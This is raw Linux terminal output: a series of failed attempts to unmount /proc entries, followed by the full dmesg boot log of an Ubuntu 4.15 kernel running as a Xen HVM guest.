umount: /proc/cmdline: not mounted.
umount: /proc/consoles: not mounted.
umount: /proc/cpuinfo: not mounted.
umount: /proc/crypto: not mounted.
umount: /proc/devices: not mounted.
umount: /proc/diskstats: not mounted.
umount: /proc/dma: not mounted.
umount: /proc/driver: not mounted.
umount: /proc/execdomains: not mounted.
umount: /proc/fb: not mounted.
umount: /proc/filesystems: not mounted.
umount: /proc/fs: not mounted.
umount: /proc/interrupts: not mounted.
umount: /proc/iomem: not mounted.
umount: /proc/ioports: not mounted.
umount: /proc/irq: not mounted.
umount: /proc/kallsyms: not mounted.
umount: /proc/kcore: not mounted.
umount: /proc/key-users: not mounted.
umount: /proc/keys: not mounted.
umount: /proc/kmsg: not mounted.
umount: /proc/kpagecgroup: not mounted.
umount: /proc/kpagecount: not mounted.
umount: /proc/kpageflags: not mounted.
umount: /proc/loadavg: not mounted.
umount: /proc/locks: not mounted.
umount: /proc/mdstat: not mounted.
umount: /proc/meminfo: not mounted.
umount: /proc/misc: not mounted.
umount: /proc/modules: not mounted.
umount: /proc/mounts: not mounted.
umount: /proc/mtrr: not mounted.
umount: /proc/net: not mounted.
umount: /proc/pagetypeinfo: not mounted.
umount: /proc/partitions: not mounted.
umount: /proc/sched_debug: not mounted.
umount: /proc/schedstat: not mounted.
umount: /proc/scsi: not mounted.
umount: /proc/self: not mounted.
umount: /proc/slabinfo: not mounted.
umount: /proc/softirqs: not mounted.
umount: /proc/stat: not mounted.
umount: /proc/swaps: not mounted.
umount: /proc/sys: not mounted.
umount: /proc/sysrq-trigger: not mounted.
umount: /proc/sysvipc: not mounted.
umount: /proc/thread-self: not mounted.
umount: /proc/timer_list: not mounted.
umount: /proc/tty: not mounted.
umount: /proc/uptime: not mounted.
umount: /proc/version: not mounted.
umount: /proc/version_signature: not mounted.
umount: /proc/vmallocinfo: not mounted.
umount: /proc/vmstat: not mounted.
umount: /proc/xen: not mounted.
umount: /proc/zoneinfo: not mounted.
mesg
mesg: ttyname failed: Inappropriate ioctl for device
dmesg
[    0.000000] Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 (Ubuntu 4.15.0-91.92-generic 4.15.18)
[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-91-generic root=UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184 ro maybe-ubiquity console=ttyS0
[    0.000000] KERNEL supported cpus:
[    0.000000]   Intel GenuineIntel
[    0.000000]   AMD AuthenticAMD
[    0.000000]   Centaur CentaurHauls
[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
[    0.000000] e820: BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009dfff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009e000-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000e0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000fc000000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.7 present.
[    0.000000] DMI: Xen HVM domU, BIOS 4.11.amazon 08/24/2006
[    0.000000] Hypervisor detected: Xen HVM
[    0.000000] Xen version 4.11.
[    0.000000] Xen Platform PCI: I/O protocol version 1
[    0.000000] Netfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated NICs.
[    0.000000] Blkfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated disks.
               You might have to change the root device
               from /dev/hd[a-d] to /dev/xvd[a-d]
               in your root= kernel command line option
[    0.000000] HVMOP_pagetable_dying not supported
[    0.000000] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved
[    0.000000] e820: remove [mem 0x000a0000-0x000fffff] usable
[    0.000000] e820: last_pfn = 0x40000 max_arch_pfn = 0x400000000
[    0.000000] MTRR default type: write-back
[    0.000000] MTRR fixed ranges enabled:
[    0.000000]   00000-9FFFF write-back
[    0.000000]   A0000-BFFFF write-combining
[    0.000000]   C0000-FFFFF write-back
[    0.000000] MTRR variable ranges enabled:
[    0.000000]   0 base 0000F0000000 mask 3FFFF0000000 uncachable
[    0.000000]   1 disabled
[    0.000000]   2 disabled
[    0.000000]   3 disabled
[    0.000000]   4 disabled
[    0.000000]   5 disabled
[    0.000000]   6 disabled
[    0.000000]   7 disabled
[    0.000000] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.000000] found SMP MP-table at [mem 0x000fb9a0-0x000fb9af]
[    0.000000] Scanning 1 areas for low memory corruption
[    0.000000] BRK [0x29591000, 0x29591fff] PGTABLE
[    0.000000] BRK [0x29592000, 0x29592fff] PGTABLE
[    0.000000] BRK [0x29593000, 0x29593fff] PGTABLE
[    0.000000] BRK [0x29594000, 0x29594fff] PGTABLE
[    0.000000] RAMDISK: [mem 0x3117d000-0x348b5fff]
[    0.000000] ACPI: Early table checksum verification disabled
[    0.000000] ACPI: RSDP 0x00000000000EA020 000024 (v02 Xen   )
[    0.000000] ACPI: XSDT 0x00000000FC00C780 000054 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: FACP 0x00000000FC00C440 0000F4 (v04 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: DSDT 0x00000000FC003940 008A7E (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: FACS 0x00000000FC003900 000040
[    0.000000] ACPI: FACS 0x00000000FC003900 000040
[    0.000000] ACPI: APIC 0x00000000FC00C540 0000D8 (v02 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: HPET 0x00000000FC00C690 000038 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: WAET 0x00000000FC00C6D0 000028 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: SSDT 0x00000000FC00C700 000031 (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: SSDT 0x00000000FC00C740 000033 (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: Local APIC address 0xfee00000
[    0.000000] No NUMA configuration found
[    0.000000] Faking a node at [mem 0x0000000000000000-0x000000003fffffff]
[    0.000000] NODE_DATA(0) allocated [mem 0x3ffd5000-0x3fffffff]
[    0.000000] tsc: Fast TSC calibration using PIT
[    0.000000] Zone ranges:
[    0.000000]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.000000]   DMA32    [mem 0x0000000001000000-0x000000003fffffff]
[    0.000000]   Normal   empty
[    0.000000]   Device   empty
[    0.000000] Movable zone start for each node
[    0.000000] Early memory node ranges
[    0.000000]   node   0: [mem 0x0000000000001000-0x000000000009dfff]
[    0.000000]   node   0: [mem 0x0000000000100000-0x000000003fffffff]
[    0.000000] Reserved but unavailable: 99 pages
[    0.000000] Initmem setup node 0 [mem 0x0000000000001000-0x000000003fffffff]
[    0.000000] On node 0 totalpages: 262045
[    0.000000]   DMA zone: 64 pages used for memmap
[    0.000000]   DMA zone: 21 pages reserved
[    0.000000]   DMA zone: 3997 pages, LIFO batch:0
[    0.000000]   DMA32 zone: 4032 pages used for memmap
[    0.000000]   DMA32 zone: 258048 pages, LIFO batch:31
[    0.000000] ACPI: PM-Timer IO Port: 0xb008
[    0.000000] ACPI: Local APIC address 0xfee00000
[    0.000000] IOAPIC[0]: apic_id 1, version 17, address 0xfec00000, GSI 0-47
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 low level)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 low level)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 low level)
[    0.000000] ACPI: IRQ0 used by override.
[    0.000000] ACPI: IRQ5 used by override.
[    0.000000] ACPI: IRQ9 used by override.
[    0.000000] ACPI: IRQ10 used by override.
[    0.000000] ACPI: IRQ11 used by override.
[    0.000000] Using ACPI (MADT) for SMP configuration information
[    0.000000] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.000000] smpboot: Allowing 15 CPUs, 14 hotplug CPUs
[    0.000000] PM: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.000000] PM: Registered nosave memory: [mem 0x0009e000-0x0009ffff]
[    0.000000] PM: Registered nosave memory: [mem 0x000a0000-0x000dffff]
[    0.000000] PM: Registered nosave memory: [mem 0x000e0000-0x000fffff]
[    0.000000] e820: [mem 0x40000000-0xfbffffff] available for PCI devices
[    0.000000] Booting paravirtualized kernel on Xen HVM
[    0.000000] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns
[    0.000000] random: get_random_bytes called from start_kernel+0x99/0x4fd with crng_init=0
[    0.000000] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:15 nr_cpu_ids:15 nr_node_ids:1
[    0.000000] percpu: Embedded 45 pages/cpu s147456 r8192 d28672 u262144
[    0.000000] pcpu-alloc: s147456 r8192 d28672 u262144 alloc=1*2097152
[    0.000000] pcpu-alloc: [0] 00 01 02 03 04 05 06 07 [0] 08 09 10 11 12 13 14 -- 
[    0.000000] xen: PV spinlocks enabled
[    0.000000] PV qspinlock hash table entries: 256 (order: 0, 4096 bytes)
[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 257928
[    0.000000] Policy zone: DMA32
[    0.000000] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-91-generic root=UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184 ro maybe-ubiquity console=ttyS0
[    0.000000] Calgary: detecting Calgary via BIOS EBDA area
[    0.000000] Calgary: Unable to locate Rio Grande table in EBDA - bailing!
[    0.000000] Memory: 943956K/1048180K available (12300K kernel code, 2481K rwdata, 4264K rodata, 2432K init, 2712K bss, 104224K reserved, 0K cma-reserved)
[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=15, Nodes=1
[    0.000000] Kernel/User page tables isolation: enabled
[    0.000000] ftrace: allocating 39347 entries in 154 pages
[    0.004000] Hierarchical RCU implementation.
[    0.004000] 	RCU restricting CPUs from NR_CPUS=8192 to nr_cpu_ids=15.
[    0.004000] 	Tasks RCU enabled.
[    0.004000] RCU: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=15
[    0.004000] NR_IRQS: 524544, nr_irqs: 952, preallocated irqs: 16
[    0.004000] xen:events: Using 2-level ABI
[    0.004000] xen:events: Xen HVM callback vector for event delivery is enabled
[    0.004000] Console: colour dummy device 80x25
[    0.004000] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!
[    0.004000] console [ttyS0] enabled
[    0.004000] ACPI: Core revision 20170831
[    0.004000] ACPI: 3 ACPI AML tables successfully acquired and loaded
[    0.004000] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 30580167144 ns
[    0.004000] hpet clockevent registered
[    0.004014] APIC: Switch to symmetric I/O mode setup
[    0.008000] x2apic: IRQ remapping doesn't support X2APIC mode
[    0.012004] Switched APIC routing to physical flat.
[    0.022650] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=0 pin2=0
[    0.052000] tsc: Fast TSC calibration using PIT
[    0.072003] tsc: Detected 2299.944 MHz processor
[    0.076001] tsc: Detected 2300.018 MHz TSC
[    0.076010] Calibrating delay loop (skipped), value calculated using timer frequency.. 4600.03 BogoMIPS (lpj=9200072)
[    0.092003] pid_max: default: 32768 minimum: 301
[    0.096065] Security Framework initialized
[    0.100002] Yama: becoming mindful.
[    0.104037] AppArmor: AppArmor initialized
[    0.112233] Dentry cache hash table entries: 131072 (order: 8, 1048576 bytes)
[    0.120113] Inode-cache hash table entries: 65536 (order: 7, 524288 bytes)
[    0.128023] Mount-cache hash table entries: 2048 (order: 2, 16384 bytes)
[    0.136010] Mountpoint-cache hash table entries: 2048 (order: 2, 16384 bytes)
[    0.148090] Last level iTLB entries: 4KB 64, 2MB 8, 4MB 8
[    0.152003] Last level dTLB entries: 4KB 64, 2MB 0, 4MB 0, 1GB 4
[    0.156004] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.164003] Spectre V2 : Mitigation: Full generic retpoline
[    0.168003] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.176002] Speculative Store Bypass: Vulnerable
[    0.180030] MDS: Vulnerable: Clear CPU buffers attempted, no microcode
[    0.203880] clocksource: xen: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.212020] Xen: using vcpuop timer interface
[    0.212039] installing Xen timer for CPU 0
[    0.220108] smpboot: CPU0: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (family: 0x6, model: 0x4f, stepping: 0x1)
[    0.224061] cpu 0 spinlock event irq 53
[    0.228125] Performance Events: unsupported p6 CPU model 79 no PMU driver, software events only.
[    0.232061] Hierarchical SRCU implementation.
[    0.236665] NMI watchdog: Perf event create on CPU 0 failed with -2
[    0.240007] NMI watchdog: Perf NMI watchdog permanently disabled
[    0.244237] smp: Bringing up secondary CPUs ...
[    0.248006] smp: Brought up 1 node, 1 CPU
[    0.251614] smpboot: Max logical packages: 15
[    0.252005] smpboot: Total of 1 processors activated (4600.03 BogoMIPS)
[    0.256244] devtmpfs: initialized
[    0.260030] x86/mm: Memory block size: 128MB
[    0.264225] evm: security.selinux
[    0.267498] evm: security.SMACK64
[    0.268008] evm: security.SMACK64EXEC
[    0.271549] evm: security.SMACK64TRANSMUTE
[    0.272009] evm: security.SMACK64MMAP
[    0.276005] evm: security.apparmor
[    0.279797] evm: security.ima
[    0.280008] evm: security.capability
[    0.284105] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.288028] futex hash table entries: 4096 (order: 6, 262144 bytes)
[    0.292133] pinctrl core: initialized pinctrl subsystem
[    0.296125] RTC time: 22:31:33, date: 12/08/23
[    0.300130] NET: Registered protocol family 16
[    0.304120] audit: initializing netlink subsys (disabled)
[    0.308145] audit: type=2000 audit(1702074693.821:1): state=initialized audit_enabled=0 res=1
[    0.312099] cpuidle: using governor ladder
[    0.316008] cpuidle: using governor menu
[    0.319523] ACPI: bus type PCI registered
[    0.320006] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5
[    0.324733] PCI: Using configuration type 1 for base access
[    0.329111] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages
[    0.332292] ACPI: Added _OSI(Module Device)
[    0.336010] ACPI: Added _OSI(Processor Device)
[    0.340008] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.343479] ACPI: Added _OSI(Processor Aggregator Device)
[    0.344021] ACPI: Added _OSI(Linux-Dell-Video)
[    0.346956] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)
[    0.348029] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)
[    0.351697] xen: --> pirq=16 -> irq=9 (gsi=9)
[    0.355643] ACPI: Interpreter enabled
[    0.356027] ACPI: (supports S0 S3 S4 S5)
[    0.359367] ACPI: Using IOAPIC for interrupt routing
[    0.360044] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.364819] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.416146] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.420018] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI]
[    0.424021] acpi PNP0A03:00: _OSC failed (AE_NOT_FOUND); disabling ASPM
[    0.428028] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    0.433539] acpiphp: Slot [0] registered
[    0.437958] acpiphp: Slot [3] registered
[    0.440725] acpiphp: Slot [4] registered
[    0.444454] acpiphp: Slot [5] registered
[    0.448664] acpiphp: Slot [6] registered
[    0.452740] acpiphp: Slot [7] registered
[    0.456674] acpiphp: Slot [8] registered
[    0.460632] acpiphp: Slot [9] registered
[    0.464623] acpiphp: Slot [10] registered
[    0.468592] acpiphp: Slot [11] registered
[    0.472827] acpiphp: Slot [12] registered
[    0.476140] acpiphp: Slot [13] registered
[    0.479882] acpiphp: Slot [14] registered
[    0.480684] acpiphp: Slot [15] registered
[    0.484644] acpiphp: Slot [16] registered
[    0.489120] acpiphp: Slot [17] registered
[    0.492866] acpiphp: Slot [18] registered
[    0.496808] acpiphp: Slot [19] registered
[    0.500960] acpiphp: Slot [20] registered
[    0.504956] acpiphp: Slot [21] registered
[    0.508818] acpiphp: Slot [22] registered
[    0.512905] acpiphp: Slot [23] registered
[    0.516851] acpiphp: Slot [24] registered
[    0.520925] acpiphp: Slot [25] registered
[    0.524762] acpiphp: Slot [26] registered
[    0.528709] acpiphp: Slot [27] registered
[    0.532837] acpiphp: Slot [28] registered
[    0.536895] acpiphp: Slot [29] registered
[    0.540916] acpiphp: Slot [30] registered
[    0.544778] acpiphp: Slot [31] registered
[    0.548811] PCI host bridge to bus 0000:00
[    0.552008] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.556010] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.560010] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.564009] pci_bus 0000:00: root bus resource [mem 0xf0000000-0xfbffffff window]
[    0.568010] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.571951] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.575410] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.579933] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.583724] pci 0000:00:01.1: reg 0x20: [io  0xc100-0xc10f]
[    0.585315] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.588009] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.592000] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.592009] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.597245] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.597330] * Found PM-Timer Bug on the chipset. Due to workarounds for a bug,
               * this clock source is slow. Consider trying other clock sources
[    0.602627] pci 0000:00:01.3: quirk: [io  0xb000-0xb03f] claimed by PIIX4 ACPI
[    0.606114] pci 0000:00:02.0: [1013:00b8] type 00 class 0x030000
[    0.607128] pci 0000:00:02.0: reg 0x10: [mem 0xf0000000-0xf1ffffff pref]
[    0.607674] pci 0000:00:02.0: reg 0x14: [mem 0xf3000000-0xf3000fff]
[    0.610609] pci 0000:00:02.0: BAR 0: assigned to efifb
[    0.613563] pci 0000:00:03.0: [5853:0001] type 00 class 0xff8000
[    0.614776] pci 0000:00:03.0: reg 0x10: [io  0xc000-0xc0ff]
[    0.615391] pci 0000:00:03.0: reg 0x14: [mem 0xf2000000-0xf2ffffff pref]
[    0.622529] ACPI: PCI Interrupt Link [LNKA] (IRQs *5 10 11)
[    0.624412] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)
[    0.628423] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)
[    0.632501] ACPI: PCI Interrupt Link [LNKD] (IRQs *5 10 11)
[    0.650506] xen:balloon: Initialising balloon driver
[    0.656235] SCSI subsystem initialized
[    0.660070] libata version 3.00 loaded.
[    0.660217] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.664000] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.664008] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.668008] vgaarb: loaded
[    0.670128] ACPI: bus type USB registered
[    0.672032] usbcore: registered new interface driver usbfs
[    0.675740] usbcore: registered new interface driver hub
[    0.676025] usbcore: registered new device driver usb
[    0.679911] EDAC MC: Ver: 3.0.0
[    0.681089] PCI: Using ACPI for IRQ routing
[    0.684009] PCI: pci_cache_line_size set to 64 bytes
[    0.684997] e820: reserve RAM buffer [mem 0x0009e000-0x0009ffff]
[    0.685121] NetLabel: Initializing
[    0.688008] NetLabel:  domain hash size = 128
[    0.691594] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.692027] NetLabel:  unlabeled traffic allowed by default
[    0.696652] HPET: 3 timers in total, 0 timers will be used for per-cpu timer
[    0.700037] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.704009] hpet0: 3 comparators, 64-bit 62.500000 MHz counter
[    0.710078] clocksource: Switched to clocksource xen
[    0.724268] VFS: Disk quotas dquot_6.6.0
[    0.727695] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.734128] AppArmor: AppArmor Filesystem Enabled
[    0.738665] pnp: PnP ACPI init
[    0.741602] system 00:00: [mem 0x00000000-0x0009ffff] could not be reserved
[    0.748329] system 00:00: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.748445] system 00:01: [io  0x08a0-0x08a3] has been reserved
[    0.754378] system 00:01: [io  0x0cc0-0x0ccf] has been reserved
[    0.759618] system 00:01: [io  0x04d0-0x04d1] has been reserved
[    0.765050] system 00:01: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.765090] xen: --> pirq=17 -> irq=8 (gsi=8)
[    0.765113] pnp 00:02: Plug and Play ACPI device, IDs PNP0b00 (active)
[    0.765149] xen: --> pirq=18 -> irq=12 (gsi=12)
[    0.765165] pnp 00:03: Plug and Play ACPI device, IDs PNP0f13 (active)
[    0.765192] xen: --> pirq=19 -> irq=1 (gsi=1)
[    0.765203] pnp 00:04: Plug and Play ACPI device, IDs PNP0303 PNP030b (active)
[    0.765227] xen: --> pirq=20 -> irq=6 (gsi=6)
[    0.765229] pnp 00:05: [dma 2]
[    0.765244] pnp 00:05: Plug and Play ACPI device, IDs PNP0700 (active)
[    0.765280] xen: --> pirq=21 -> irq=4 (gsi=4)
[    0.765295] pnp 00:06: Plug and Play ACPI device, IDs PNP0501 (active)
[    0.765374] system 00:07: [io  0x10c0-0x1141] has been reserved
[    0.770532] system 00:07: [io  0xb044-0xb047] has been reserved
[    0.775368] system 00:07: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.784028] random: fast init done
[    0.795935] pnp: PnP ACPI: found 8 devices
[    0.805154] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.814368] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.814370] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.814371] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.814372] pci_bus 0000:00: resource 7 [mem 0xf0000000-0xfbffffff window]
[    0.814607] NET: Registered protocol family 2
[    0.819426] TCP established hash table entries: 8192 (order: 4, 65536 bytes)
[    0.827390] TCP bind hash table entries: 8192 (order: 5, 131072 bytes)
[    0.833876] TCP: Hash tables configured (established 8192 bind 8192)
[    0.838872] UDP hash table entries: 512 (order: 2, 16384 bytes)
[    0.843382] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)
[    0.848517] NET: Registered protocol family 1
[    0.856646] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.863889] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.869619] pci 0000:00:01.0: Activating ISA DMA hang workarounds
[    0.875913] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.883482] PCI: CLS 0 bytes, default 64
[    0.883534] Unpacking initramfs...
[    1.624604] Freeing initrd memory: 56548K
[    1.640756] Scanning for low memory corruption every 60 seconds
[    1.648180] Initialise system trusted keyrings
[    1.653806] Key type blacklist registered
[    1.656988] workingset: timestamp_bits=36 max_order=18 bucket_order=0
[    1.662971] zbud: loaded
[    1.665788] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    1.669893] fuse init (API version 7.26)
[    1.673561] Key type asymmetric registered
[    1.676369] Asymmetric key parser 'x509' registered
[    1.679835] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 246)
[    1.686153] io scheduler noop registered
[    1.691080] io scheduler deadline registered
[    1.696810] io scheduler cfq registered (default)
[    1.700320] efifb: probing for efifb
[    1.703829] efifb: framebuffer at 0xf0000000, using 1408k, total 1408k
[    1.709036] efifb: mode is 800x600x24, linelength=2400, pages=1
[    1.713843] efifb: scrolling: redraw
[    1.716583] efifb: Truecolor: size=0:8:8:8, shift=0:16:8:0
[    1.721685] Console: switching to colour frame buffer device 100x37
[    1.738292] fb0: EFI VGA frame buffer device
[    1.743497] intel_idle: Please enable MWAIT in BIOS SETUP
[    1.743691] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.748296] ACPI: Power Button [PWRF]
[    1.750729] input: Sleep Button as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input1
[    1.755497] ACPI: Sleep Button [SLPF]
[    1.758675] xen: --> pirq=22 -> irq=28 (gsi=28)
[    1.758933] xen:grant_table: Grant tables using version 1 layout
[    1.765166] Grant table initialized
[    1.767755] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!
[    1.771503] Serial: 8250/16550 driver, 32 ports, IRQ sharing enabled
[    1.836922] 00:06: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.849533] Linux agpgart interface v0.103
[    1.856646] loop: module loaded
[    1.859872] Invalid max_queues (4), will use default max: 1.
[    1.868904] ata_piix 0000:00:01.1: version 2.13
[    1.870056] scsi host0: ata_piix
[    1.872789] scsi host1: ata_piix
[    1.875552] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc100 irq 14
[    1.880724] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc108 irq 15
[    1.888164] libphy: Fixed MDIO Bus: probed
[    1.891261] tun: Universal TUN/TAP device driver, 1.6
[    1.895075] PPP generic driver version 2.4.2
[    1.906461] xen_netfront: Initialising Xen virtual ethernet driver
[    1.932104] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    1.945229] ehci-pci: EHCI PCI platform driver
[    1.949511] ehci-platform: EHCI generic platform driver
[    1.955302] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    1.962494] ohci-pci: OHCI PCI platform driver
[    1.968692] ohci-platform: OHCI generic platform driver
[    1.975540] uhci_hcd: USB Universal Host Controller Interface driver
[    1.983426] i8042: PNP: PS/2 Controller [PNP0303:PS2K,PNP0f13:PS2M] at 0x60,0x64 irq 1,12
[    1.998382] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.005627] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.012114] mousedev: PS/2 mouse device common for all mice
[    2.022248] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input2
[    2.035407] rtc_cmos 00:02: rtc core: registered rtc_cmos as rtc0
[    2.045879] rtc_cmos 00:02: alarms up to one day, 114 bytes nvram, hpet irqs
[    2.053110] i2c /dev entries driver
[    2.055922] device-mapper: uevent: version 1.0.3
[    2.061545] device-mapper: ioctl: 4.37.0-ioctl (2017-09-20) initialised: dm-devel@redhat.com
[    2.074084] ledtrig-cpu: registered to indicate activity on CPUs
[    2.082147] NET: Registered protocol family 10
[    2.096861] Segment Routing with IPv6
[    2.099973] NET: Registered protocol family 17
[    2.105398] Key type dns_resolver registered
[    2.109595] mce: Using 2 MCE banks
[    2.112811] RAS: Correctable Errors collector initialized.
[    2.122737] sched_clock: Marking stable (2122697408, 0)->(2998905742, -876208334)
[    2.130596] registered taskstats version 1
[    2.133836] Loading compiled-in X.509 certificates
[    2.139111] blkfront: xvda: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;
[    2.148264] Loaded X.509 cert 'Build time autogenerated kernel key: d019e8c5f4cbc828f6af43369f65a014a3a68371'
[    2.162580] zswap: loaded using pool lzo/zbud
[    2.175577] Key type big_key registered
[    2.180018] Key type trusted registered
[    2.187478]  xvda: xvda1 xvda2
[    2.191551] Key type encrypted registered
[    2.195810] AppArmor: AppArmor sha1 policy hashing enabled
[    2.200534] ima: No TPM chip found, activating TPM-bypass! (rc=-19)
[    2.206548] ima: Allocated hash algorithm: sha1
[    2.226396] evm: HMAC attrs: 0x1
[    2.230738] blkfront: xvdh: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;
[    2.332112]   Magic number: 3:451:552
[    2.341835] tty ttyS28: hash matches
[    2.345485] clockevents clockevent3: hash matches
[    2.349736] acpi PNP0C0F:03: hash matches
[    2.354705] rtc_cmos 00:02: setting system clock to 2023-12-08 22:31:36 UTC (1702074696)
[    2.364634] BIOS EDD facility v0.16 2004-Jun-25, 0 devices found
[    2.372161] EDD information not available.
[    2.381090] Freeing unused kernel image memory: 2432K
[    2.396056] Write protecting the kernel read-only data: 20480k
[    2.404799] Freeing unused kernel image memory: 2008K
[    2.411090] Freeing unused kernel image memory: 1880K
[    2.422078] x86/mm: Checked W+X mappings: passed, no W+X pages found.
